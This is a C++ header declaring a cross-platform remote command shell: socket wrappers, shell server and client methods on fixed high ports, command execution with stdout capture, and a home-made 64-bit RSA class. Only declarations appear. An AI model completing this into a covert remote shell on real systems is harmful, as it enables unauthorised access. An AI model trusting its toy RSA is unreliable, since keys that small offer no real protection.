#pragma once
#ifndef UTILS_L
#define UTILS_L

#ifdef _MSC_VER
#  include <WinSock2.h>
#  include <WS2tcpip.h>
#else
#  include <sys/socket.h>
#  include <arpa/inet.h>
#  include <netinet/in.h>
#endif // _MSC_VER
#  include <string>
#  include <string.h>

namespace core {
	typedef signed char   	     int8_t;
	typedef char		    cint8_t;
	typedef unsigned char	    uint8_t;
	typedef signed short	   sint16_t;
	typedef short	       	    int16_t;
	typedef unsigned short	   uint16_t;
	typedef signed int	   sint32_t;
	typedef int		    int32_t;
	typedef unsigned int	   uint32_t;
	typedef signed long long   sint64_t;
	typedef long long	    int64_t;
	typedef unsigned long long uint64_t;

	enum l4_proto_peak {
		tcp_peak = 0x31,
		udp_peak
	};

	enum port {
		port_connect = 65534,
		port_accept
	};

	namespace IShellAPI_types {
		#ifdef _MSC_VER
			typedef	SOCKET		     SOCKET;
			typedef core::int32_t     socklen_t;
		#else
			typedef core::uint64_t	     SOCKET;
			typedef socklen_t	  socklen_t;
		#endif // _MSC_VER
	}

	namespace errors {
		#ifdef _MSC_VER
			const static core::sint32_t ERROR_CREATE_WINSOCK_VER = -0x20;
		#endif // _MSC_VER

		const static core::sint32_t ERROR_CREATE_SOCKET		 = -0x21;
		const static core::sint32_t ERROR_CREATE_BIND		 = -0x22;
		const static core::sint32_t ERROR_CREATE_CONNECT	 = -0x23;
		const static core::sint32_t ERROR_CREATE_LISTEN		 = -0x29;
		const static core::sint32_t ERROR_CREATE_SEND_PACKET	 = -0x24;
		const static core::sint32_t ERROR_CREATE_RECV_PACKET	 = -0x25;
		const static core::sint32_t ERROR_CREATE_SENDTO_PACKET   = -0x26;
		const static core::sint32_t ERROR_CREATE_RECVFROM_PACKET = -0x27;

		const static core::sint32_t ERROR_READ_STDOUT		 = -0x28;
	}
}

class IShellUtilsCipherRSA { // RSA Cipher to dev
private:
	core::uint64_t keys[2]; // keys data
	core::uint64_t masterkey_buffer; // for keeping masterkey rsa
	core::uint32_t public_exp; // open exp
	core::uint32_t secret_exp;

	core::uint64_t public_key; // public key for encrypt
	core::uint64_t secret_key; // secret key for decrypt

	void* raw_data;
	void* encrypt_data;
protected:
	IShellUtilsCipherRSA(core::uint64_t, core::uint64_t); // keys hook
	IShellUtilsCipherRSA();
	~IShellUtilsCipherRSA();

	void hook_data_rsa(void*); // pick data for treatment
	void composition_keys_rsa(); // compose two keys from array core::uint64_t keys[2]
	void eiler_func_rsa(); // F(n) = (keys[0] - 1) * (keys[1] - 1)
	core::uint64_t return_public_key_rsa();

	void public_exp_rsa(); // 1 < e < F(n)
	void secret_exp_rsa(); // d = (k * F(n) + 1) / e // d = e^-1 mod F(n)

	void* encrypt_rsa_data();
	void* decrypt_rsa_data();
};

class IShell { // shell utils
protected:
	void bytes_convert(void*, void*, core::IShellAPI_types::socklen_t);

	core::sint32_t exec(std::string*);
	std::string    cmd();
};

class IShellAPI : public IShellUtilsCipherRSA, IShell {
private:
	struct InAddr {
		core::uint32_t in_addr;
	};

	typedef struct conn_data {
		InAddr		 sin_addr;
		core::uint16_t   sin_port;
		core::int32_t  sin_family;
		core::cint8_t sin_zero[8];
	} pkt_t;

	typedef struct sock_struct_raw {
		core::uint16_t sa_family;
		core::cint8_t sa_data[14];
	} pkt_raw_t, *_pkt_raw_t;

	typedef struct data {
		pkt_t*			      sin_connect;
		core::IShellAPI_types::SOCKET* sin_socket;

		core::IShellAPI_types::socklen_t sin_size;
		core::int32_t		    l4_proto_peak;
		core::int32_t			part_peak;
	} pkt_data_t;

	core::int32_t __stdcall _bind(core::IShellAPI_types::SOCKET, _pkt_raw_t, core::IShellAPI_types::socklen_t);
	core::int32_t __stdcall _connect(core::IShellAPI_types::SOCKET, _pkt_raw_t, core::IShellAPI_types::socklen_t);
	core::IShellAPI_types::SOCKET __stdcall _accept(core::IShellAPI_types::SOCKET, _pkt_raw_t, core::IShellAPI_types::socklen_t);

	std::string _inet_ntoa(InAddr);

	pkt_data_t*   pkt_data;
	std::string ip_address;

	core::sint32_t error_buffer;
public:
	IShellAPI(std::string &);
	~IShellAPI();

	core::sint32_t init_socket(core::int32_t = core::l4_proto_peak::tcp_peak);
	core::sint32_t shell_server();
	core::sint32_t shell_client();
};

#endif // UTILS_L
